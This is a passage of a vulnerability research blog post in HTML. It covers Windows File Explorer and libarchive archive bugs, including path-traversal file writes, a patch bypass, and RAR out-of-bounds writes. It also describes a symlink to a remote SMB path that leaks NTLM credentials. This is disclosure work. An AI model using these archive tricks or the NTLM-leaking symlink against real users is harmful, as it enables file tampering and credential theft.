&lt;p&gt;That means File Explorer considers here a place to put its temporary files; thus, the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;poc.txt&lt;/code&gt; file is also here, inside the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;poc&lt;/code&gt; folder:
&lt;img src=&quot;/assets/img/blog/20250212/17.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;In other words, we have discovered an Arbitrary File Write vulnerability! Since this write operation aims to place temporary files, the files will be deleted after a while. Therefore, what we have actually found is an Arbitrary File Write/Delete vulnerability. But it’s a shame that the permissions used for both writing and deleting are limited to the current user’s privileges.&lt;/p&gt;

&lt;p&gt;That’s &lt;a href=&quot;https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-26185&quot;&gt;CVE-2024-26185&lt;/a&gt;, a funny yet useless vulnerability. To exploit it to create or delete a file in a specific location, you would need to create the exact same path structure within the archive and then trick the user into opening every folder and double-clicking the target file. Most people would probably find it suspicious halfway through the process.&lt;/p&gt;

&lt;p&gt;Well, that may be true, but according to the rules, Microsoft still has to pay me $1,000. Yay!&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250212/18.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;cve-2024-26185-root-cause&quot;&gt;CVE-2024-26185: Root Cause&lt;/h3&gt;

&lt;p&gt;The root cause of CVE-2024-26185 is the insufficient filtering of file names. After decompiling the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;zipfldr.dll&lt;/code&gt;, we found it will call &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;replace_invalid_path_chars&lt;/code&gt; to sanitize the file name before decompression. The function replaces &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&quot;*:&amp;lt;&amp;gt;?|&lt;/code&gt; with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;_&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/&lt;/code&gt; with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;\&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Additionally, when interacting with the “Compressed (zipped) Folder” or “Compressed Archive Folder,” users have three methods to extract files, each triggering a different function:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Double-clicking a file inside the archive
    &lt;ul&gt;
      &lt;li&gt;Triggers &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ExtractFromArchiveByIndex&lt;/code&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;Double-clicking a cmd, bat, or exe file inside the archive
    &lt;ul&gt;
      &lt;li&gt;Triggers &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ExtractEntireArchive&lt;/code&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;Right-clicking the archive and selecting “Extract All” from the menu
    &lt;ul&gt;
      &lt;li&gt;Triggers &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ArchiveExtractWizard::ExtractToDestination&lt;/code&gt;&lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;All of them use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;archive_read_next_header&lt;/code&gt; to get the file names in the archive, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;replace_invalid_path_chars&lt;/code&gt; to sanitize the file name, and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ExtractArchiveEntry&lt;/code&gt; to actually extract the file. However, they forgot to call &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;replace_invalid_path_chars&lt;/code&gt; in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ExtractFromArchiveByIndex&lt;/code&gt;, which is triggered when “Double-clicking a file inside the archive,” leading to the arbitrary file write and arbitrary file delete vulnerabilities.
&lt;img src=&quot;/assets/img/blog/20250212/19.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;cve-2024-38165-bypassing-the-patch-for-cve-2024-26185&quot;&gt;CVE-2024-38165: Bypassing the Patch for CVE-2024-26185&lt;/h3&gt;

&lt;p&gt;After Microsoft patched CVE-2024-26185, we randomly picked some PoCs created a while ago and executed them to check the patch’s correctness. It turns out that some of our PoCs are still working!?&lt;/p&gt;

&lt;p&gt;In the patch, they add a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;replace_invalid_path_chars&lt;/code&gt; before 
&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ExtractFromArchiveByIndex&lt;/code&gt; to sanitize the file name. It looks perfect:
&lt;img src=&quot;/assets/img/blog/20250212/20.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;However, it can be easily bypassed by &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;\poc\poc.txt&lt;/code&gt;. How does that happen? Let’s follow the code step by step. First, the file name &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;\poc\poc.txt&lt;/code&gt; is passed into &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;replace_invalid_path_chars&lt;/code&gt;. Since there are no invalid characters in the file name, the output is still &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;\poc\poc.txt&lt;/code&gt;:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250212/21.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Next, because &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;zipfldr.dll&lt;/code&gt; is currently “extracting file to a temporary folder under the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;%TEMP%&lt;/code&gt; to let users interact with it,” the file name should be concatenated with the path of the temporary folder to construct the destination of extraction:
&lt;img src=&quot;/assets/img/blog/20250212/22.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;But here comes the problem, in Windows, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;C:\&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;\&lt;/code&gt; are both considered as root. In other words, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;zipfldr.dll&lt;/code&gt; is currently concatenating two absolute paths! According to &lt;a href=&quot;https://github.com/microsoft/STL/blob/90820002693fe6eaaec2e55884472c654186207e/stl/inc/filesystem#L723&quot;&gt;the STL implemented by Microsoft&lt;/a&gt;, if two arguments of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;std::filesystem::operator/&lt;/code&gt; are both absolute paths, it will return the second argument directly. Thus, the function’s return value is  &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;C:\poc\poc.txt&lt;/code&gt;, causing a patch bypass.
&lt;img src=&quot;/assets/img/blog/20250212/23.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;symlink-ntlm-exfiltration&quot;&gt;Symlink NTLM Exfiltration&lt;/h3&gt;

&lt;p&gt;Of course, it’s vulnerable without &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;replace_invalid_path_chars&lt;/code&gt;. But can we still exploit File Explorer even if &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;replace_invalid_path_chars&lt;/code&gt; is used correctly? This function only filters &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&quot;*:&amp;lt;&amp;gt;?|&lt;/code&gt;, meaning &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.&lt;/code&gt; can still be used to construct a remote path. Could NTLM exfiltration still be possible? We attempted to construct paths such as:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;\\172.23.176.34\Users\nini\Desktop\sharing\test.txt&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;\Device\Mup\172.23.176.34\Users\nini\Desktop\sharing\test.txt&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;While these are regular files, they only create a corresponding directory under the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;C:&lt;/code&gt; volume (before the CVE-2024-38165 fix). However, if we create a symlink pointing to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;\\172.23.176.34\poc\poc.txt&lt;/code&gt;, when the user either double-clicks the symlink or selects “Extract All,” File Explorer will attempt to communicate with the SMB server at that IP address, leading to an NTLM leak:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250212/24.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Moreover, Windows determines the file type within the archive based solely on the file extension, which can be highly misleading. For example, in this case, our symlink file was recognized as a Text Document:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250212/25.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;However, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;zipfldr.dll&lt;/code&gt; uses the &lt;a href=&quot;https://learn.microsoft.com/zh-tw/windows/win32/api/winbase/nf-winbase-createsymboliclinka&quot;&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CreateSymbolicLinkA&lt;/code&gt;&lt;/a&gt; API to create a symlink during decompression. Although this API requires elevated privileges, File Explorer won’t prompt for privilege escalation and will simply display an error message instead.
&lt;img src=&quot;/assets/img/blog/20250212/26.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Even though File Explorer adds the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SYMBOLIC_LINK_FLAG_ALLOW_UNPRIVILEGED_CREATE&lt;/code&gt; flag when using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CreateSymbolicLinkA&lt;/code&gt;, the documentation states that Developer Mode must be enabled for this flag to take effect.
&lt;img src=&quot;/assets/img/blog/20250212/27.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The “extracting symlink from archive” feature appears to be incomplete, limiting the vulnerability to attacks targeting administrators or developers. As a result, it does not meet MSRC’s threshold for immediate servicing. Therefore, they will not provide ongoing updates on the status of the fix and have closed this case.&lt;/p&gt;

&lt;h2 id=&quot;libarchive&quot;&gt;Libarchive&lt;/h2&gt;

&lt;p&gt;In the previous section, we mentioned that &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;zipfldr.dll&lt;/code&gt; is responsible for handling interactions with the “Compressed (zipped) Folder” and “Compressed Archive Folder.”&lt;/p&gt;

&lt;p&gt;In this section, we’ll talk about the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;archiveint.dll&lt;/code&gt;, which is actually a forked version of libarchive. Libarchive is a powerful, open-source library for handling archive file formats. It is used across multiple operating systems like Linux, BSD, and macOS, as well as in projects such as ClickHouse, Homebrew, and Osquery. Google’s OSS-Fuzz project has continuously fuzzed it 24/7 since 2016, making it a time-tested library.&lt;/p&gt;

&lt;p&gt;By black-box testing, we observed several interesting behaviors.&lt;/p&gt;

&lt;h3 id=&quot;fun-fact-1-windows-supports-file-formats-more-than-they-claimed&quot;&gt;Fun Fact 1: Windows Supports File Formats More Than They Claimed&lt;/h3&gt;

&lt;p&gt;Although Microsoft claimed to have added native support for the following 11 archive formats in the KB5031455 update, the actual number of supported file formats far exceeds 11.
&lt;img src=&quot;/assets/img/blog/20250212/28.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;This is how Windows initialize libarchive in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;zipfldr.dll&lt;/code&gt;:
&lt;img src=&quot;/assets/img/blog/20250212/29.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;In fact, the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;archive_read_support_format_all&lt;/code&gt; function in libarchive enables support for a total of 13 archive formats, including ar, cpio, lha, mtree, tar, xar, warc, 7zip, cab, rar, rar5, iso9660, and zip; the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;archive_read_support_filter_all&lt;/code&gt; function in libarchive enables support for a total of 13 filters, including bzip2, compress, gzip, lzip, lzma, xz, uu, rpm, lrzip, lzop, grzip, lz4, zstd.&lt;/p&gt;

&lt;p&gt;In addition, format and filer can be used simultaneously. For example, the tar format and gzip filter should be enabled to support the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.tar.gz&lt;/code&gt; file format. So, the total number of Windows’ natively supported file formats is 13+13+13×13=195 ?&lt;/p&gt;

&lt;p&gt;Completely wrong! A maximum of 25 filters can be chained, e.g., &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;archive.rar.gzip.xz.uu.zstd.uu......&lt;/code&gt;. That said, Windows 11 actually supports 13+13+13×13²⁵ types of file formats, which equals &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;91733330193268616658399616035&lt;/code&gt; formats! For free!&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;As a result, the attack surface has significantly expanded after the update. Any vulnerability in a file format within libarchive can be triggered on Windows. Additionally, parsing multiple filters simultaneously could also introduce security weaknesses.&lt;/strong&gt;&lt;/p&gt;

&lt;h3 id=&quot;fun-fact-2-file-format-confusion&quot;&gt;Fun Fact 2: File Format Confusion&lt;/h3&gt;

&lt;p&gt;When calling libarchive to decompress files, there is no need to specify the archive’s file format; libarchive automatically determines the format based on the content. However, there is a chance that File Format Confusion can happen when ZIP support is enabled. For example, if we create a demo3.rar archive and place a poc.zip file inside, the result will look like this:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250212/30.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;If we double-click demo3.rar directly on Windows, we will find that only the poc2.txt file is visible, while the other folders, files, and even poc.zip are missing. This is because libarchive mistakenly identifies demo3.rar as a ZIP file!&lt;/p&gt;

&lt;p&gt;To understand the bug, let’s see how libarchive determines the file format for an archive. In &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;choose_format&lt;/code&gt;, the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;bid&lt;/code&gt; function of the enabled formats is called, and the format whose &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;bid&lt;/code&gt; returns the highest value is the one libarchive will treat the file as.
&lt;img src=&quot;/assets/img/blog/20250212/31.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Take &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ar&lt;/code&gt;’s &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;bid&lt;/code&gt; function, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;archive_read_format_ar_bid&lt;/code&gt;, for example, if the beginning 8 bytes of an archive is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&quot;!&amp;lt;arch&amp;gt;\n&quot;&lt;/code&gt;, the function will return 64, which should be derived from 8𝑏𝑖𝑡𝑠 × 8𝑏𝑦𝑡𝑒𝑠 = 64
 :
&lt;img src=&quot;/assets/img/blog/20250212/32.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Next, the RAR format’s highest score is only 30. Although it’s unclear how the number was determined, if each file format is checked starting from the beginning of the file, it should be difficult to create a polyglot that would break this mechanism, right?
&lt;img src=&quot;/assets/img/blog/20250212/33.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;But, there is a special mode for ZIP in libarchive: seekable. In other words, the ZIP signature does not need to be at the beginning of the file; libarchive will search for it itself. The highest value for a seekable ZIP is 32:
&lt;img src=&quot;/assets/img/blog/20250212/34.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The consequence is that when a RAR archive contains a ZIP file and the RAR’s compression ratio is low enough to leave the ZIP signature untouched, libarchive will incorrectly treat the RAR file as a ZIP file.&lt;/p&gt;

&lt;h3 id=&quot;fun-fact-3-sometimes-libarchive-tries-to-spawn-an-external-executable&quot;&gt;Fun Fact 3: Sometimes, Libarchive Tries to Spawn an External Executable&lt;/h3&gt;

&lt;p&gt;By reviewing the source code of libarchive, we found that if some libraries are missed during compiling, libarchive will change its behavior from using the library to executing commands to decompressing the archive:
&lt;img src=&quot;/assets/img/blog/20250212/35.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Then we decompiled the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;archiveint.dll&lt;/code&gt;, which is the forked libarchive on Windows. We confirmed that the function for decompressing some file formats will try to execute the external binary, e.g., &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;lzop_bidder_init&lt;/code&gt;:
&lt;img src=&quot;/assets/img/blog/20250212/36.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Plus, “libarchive decides which format to use for extraction based on the file content,” all we need to do is change the extension of an lzop compressed file to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.rar&lt;/code&gt;, and double-click it to trigger the corresponding lzop extraction function &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;lzop_bidder_init&lt;/code&gt;:
&lt;img src=&quot;/assets/img/blog/20250212/37.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;At the end, we’ll see that &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;explorer.exe&lt;/code&gt; is trying to execute &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;lzop&lt;/code&gt; in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;PATH&lt;/code&gt; to decompress the archive:
&lt;img src=&quot;/assets/img/blog/20250212/38.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;rces-reported-by-morse-cve-2024-20696-and-cve-2024-20697&quot;&gt;RCEs Reported by MORSE: CVE-2024-20696 and CVE-2024-20697&lt;/h3&gt;

&lt;p&gt;So far, it’s clear that libarchive introduces numerous attack surfaces. In fact, Windows also patched two vulnerabilities reported by Microsoft’s Offensive Research Security Engineering (MORSE) team in January 2024, specifically the RCE vulnerabilities &lt;a href=&quot;https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-20696&quot;&gt;CVE-2024-20696&lt;/a&gt; and &lt;a href=&quot;https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-20697&quot;&gt;CVE-2024-20697&lt;/a&gt;.&lt;/p&gt;

&lt;h4 id=&quot;cve-2024-20696-oob-write-in-copy_from_lzss_window_to_unp&quot;&gt;CVE-2024-20696: OOB Write in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;copy_from_lzss_window_to_unp&lt;/code&gt;&lt;/h4&gt;

&lt;p&gt;While extracting RAR files, the fourth argument of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;copy_from_lzss_window_to_unp&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;length&lt;/code&gt;, is calculated based on the state after lzss decompression, representing the copy length. However, it was incorrectly defined as an int. This mistake allows an attacker to manipulate the lzss data, causing length to become a negative value, bypassing validation checks, and resulting in an out-of-bounds write vulnerability.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250212/39.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h4 id=&quot;cve-2024-20697-oob-write-in-execute_filter_e8&quot;&gt;CVE-2024-20697: OOB Write in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;execute_filter_e8&lt;/code&gt;&lt;/h4&gt;

&lt;p&gt;It’s also a vulnerability that happens when extracting RAR files. If an RAR file contains an e8 filter, libarchive will run into the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;execute_filter_e8&lt;/code&gt; function. (the filter here is defined by RAR, not the filter of libarchive we mentioned earlier)
The problem is that although there is a check in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;execute_filter_e8&lt;/code&gt; to ensure the variable &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;length&lt;/code&gt; is larger or equal to 4, the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;length&lt;/code&gt; will be used in a for loop for &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;length-5&lt;/code&gt;. So, when the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;length&lt;/code&gt; is 4, the loop will run 0x100000000 times, causing an out-of-bounds write.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250212/40.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h4 id=&quot;fuzzing-why-oss-fuzz-never-found-these&quot;&gt;Fuzzing: Why OSS-Fuzz Never Found These?&lt;/h4&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250212/41.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;To reproduce these two CVEs, we must construct RAR files, which is time-consuming. In CVE-2024-20696, we have to construct data of lzss that causes the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;length&lt;/code&gt; to become a negative number; in CVE-2024-20697, we have to put an e8 filter in an RAR archive. Instead of building RAR bytes by bytes, we chose to collect RAR archives, especially those with the e8 filter, and feed them to the AFL++ fuzzer. To our surprise, it only took 56 seconds to find the first crash for CVE-2024-20697:
&lt;img src=&quot;/assets/img/blog/20250212/42.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;It’s great that the crash happened quickly, but here’s the big problem: OSS-Fuzz has been Fuzzing libarchive 24/7 since at least 2016, so how can a vulnerability found in 56 seconds not be discovered yet?
&lt;img src=&quot;/assets/img/blog/20250212/43.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;From the OSS-Fuzz summary for libarchive, we can see that in June 2024, the code coverage of libarchive was only 15.03%:
&lt;img src=&quot;/assets/img/blog/20250212/44.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;And seems it has lasted a long time:
&lt;img src=&quot;/assets/img/blog/20250212/45.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;From the file view, it is obvious that some file formats are basically untested. For example, the coverage of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;archive_read_support_format_rar.c&lt;/code&gt; is only 4.07%:
&lt;img src=&quot;/assets/img/blog/20250212/46.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h4 id=&quot;the-answer-revealed&quot;&gt;The Answer Revealed&lt;/h4&gt;

&lt;p&gt;While preparing our talks, we noticed a pull request in the libarchive repository. It turns out that though they enabled the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;DONT_FAIL_ON_CRC_ERROR&lt;/code&gt; flag for CMake while compiling libarchive for OSS-Fuzz, they didn’t define that option in CMake!?
&lt;img src=&quot;/assets/img/blog/20250212/47.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;DONT_FAIL_ON_CRC_ERROR&lt;/code&gt; flag allowed libarchive to continue processing a file even when the CRC check failed. As we all know, fuzzers are generally poor at generating correct checksums. This means that the long-term low coverage of OSS-Fuzz was due to the fuzzer’s inability to produce valid CRC values to pass the checks.&lt;/p&gt;

&lt;p&gt;After the fix, a significant improvement in OSS-Fuzz’s coverage of libarchive can be observed, increasing from 15.03% to 63.10%:
&lt;img src=&quot;/assets/img/blog/20250212/48.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;From the file view, the code coverage for individual file formats is also improved:
&lt;img src=&quot;/assets/img/blog/20250212/49.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h4 id=&quot;keep-fuzzing&quot;&gt;Keep Fuzzing&lt;/h4&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250212/50.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;While conducting the code review, we kept AFL++ working for us. At the end of our research, the fuzzer found two out-of-bound read vulnerabilities: CVE-2024-48957 and CVE-2024-48958.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250212/51.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;cve-2024-26256-libarchive-remote-code-execution-vulnerability&quot;&gt;CVE-2024-26256: Libarchive Remote Code Execution Vulnerability&lt;/h3&gt;

&lt;p&gt;After analyzing the vulnerabilities, CVE-2024-20696 and CVE-2024-20697, found by Microsoft, we found they are both in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;archive_read_support_format_rar.c&lt;/code&gt; and both in the newly added functions within the previous three years.
&lt;img src=&quot;/assets/img/blog/20250212/52.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We decided to review RAR to investigate whether there are any other vulnerabilities. The first thing we wanted to understand was what filter_e8 refers to in CVE-2024-20697 and what the “filter” mentioned in the commit message “support RAR filters” means.&lt;/p&gt;

&lt;h4 id=&quot;the-vm-in-rar&quot;&gt;The VM in RAR&lt;/h4&gt;

&lt;p&gt;To understand &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;filter_e8&lt;/code&gt;, we must know that there is a VM in RAR! There is actually a register-based VM in RAR. The VM can be used to run a custom program to improve the compression ratio of an RAR file.&lt;/p&gt;

&lt;p&gt;When creating an RAR file, a custom “filter” program can be included. The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;filter_e8&lt;/code&gt; is one such program, designed to improve the compression ratio for Intel binaries. The “e8” in its name refers to the near call opcode in the Intel instruction set.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250212/53.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;But what is the correlation between call instruction and improved compression ratio?&lt;/p&gt;

&lt;p&gt;Take the following small program as an example: if there are two &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;call&lt;/code&gt; instructions that will call &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;funcA&lt;/code&gt;, located at addresses &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x10&lt;/code&gt; respectively, we can see in the machine code that the near &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;call&lt;/code&gt; instruction starts with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0xe8&lt;/code&gt;, followed by 4 bytes, which corresponds to the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rel32&lt;/code&gt; in the manual. The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rel32&lt;/code&gt; value represents the relative offset between the address of the target function and the address of the instruction following the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;call&lt;/code&gt; instruction. For example, the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rel32&lt;/code&gt; value of the first &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;call&lt;/code&gt; instruction is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x1b&lt;/code&gt;, which is calculated by subtracting the address of the next instruction (0+5) from the address of the target function (0x20):
&lt;img src=&quot;/assets/img/blog/20250212/54.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Both instructions are used to call &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;funcA&lt;/code&gt;, but due to their different machine code representations, the compression ratio is lower. However, since the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rel32&lt;/code&gt; value can be easily calculated, it can be replaced with the absolute address of the target function, making the instructions identical and improving the compression ratio:
&lt;img src=&quot;/assets/img/blog/20250212/55.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;While decompressing, the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;e8 filter&lt;/code&gt; will be used to recover the replaced &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rel32&lt;/code&gt;:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250212/56.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;To simplify the implementation, libarchive doesn’t fully implement the entire VM. Instead, it simply calculates the fingerprint of the filter using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;crc32&lt;/code&gt;. The relevant code can be found in &lt;a href=&quot;https://github.com/libarchive/libarchive/blob/42565b88b5cc7441239269902a9d1735fd9ca0e2/libarchive/archive_read_support_format_rar.c#L3826&quot;&gt;libarchive&lt;/a&gt;:&lt;/p&gt;
&lt;div class=&quot;language-cpp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;
